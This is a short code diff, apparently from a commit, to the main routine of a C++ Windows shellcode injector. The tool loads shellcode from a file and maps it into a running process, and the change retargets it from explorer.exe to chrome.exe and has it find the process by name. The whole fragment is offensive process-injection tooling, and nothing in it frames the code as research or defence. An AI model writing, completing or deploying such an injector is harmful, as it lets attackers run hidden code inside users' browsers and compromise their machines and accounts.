@@ -4,11 +4,11 @@
 #include <iostream>
 
 int main() {
-	std::wstring wsTargetProcessName = L"explorer.exe";
+	std::wstring wsTargetProcessName = L"chrome.exe";
 	std::wstring wsShellcodePath = L"x64.bin";
 
-	//HANDLE hTargetProcess = GetProcessHandleByNameW(wsTargetProcessName);
-	HANDLE hTargetProcess = GetProcessHandleByPid(29072);
+	HANDLE hTargetProcess = GetProcessHandleByNameW(wsTargetProcessName);
+	//HANDLE hTargetProcess = GetProcessHandleByPid(29072);
 	if (hTargetProcess == nullptr) {
 		std::cout << "Failed to get process handle for " << std::string(wsTargetProcessName.begin(), wsTargetProcessName.end()) << std::endl;
 		return -1;
@@ -21,7 +21,7 @@ int main() {
 		CloseHandle(hTargetProcess);
 		return -1;
 	}
-
+	std::cout << dwShellcodeSize << std::endl;
 	LPVOID lpRemoteAddr = nullptr;
 	if (!MappingShellcode(hTargetProcess, lpShellcode, dwShellcodeSize, &lpRemoteAddr)) {
 		std::cout << "Failed to map shellcode into target process." << std::endl;
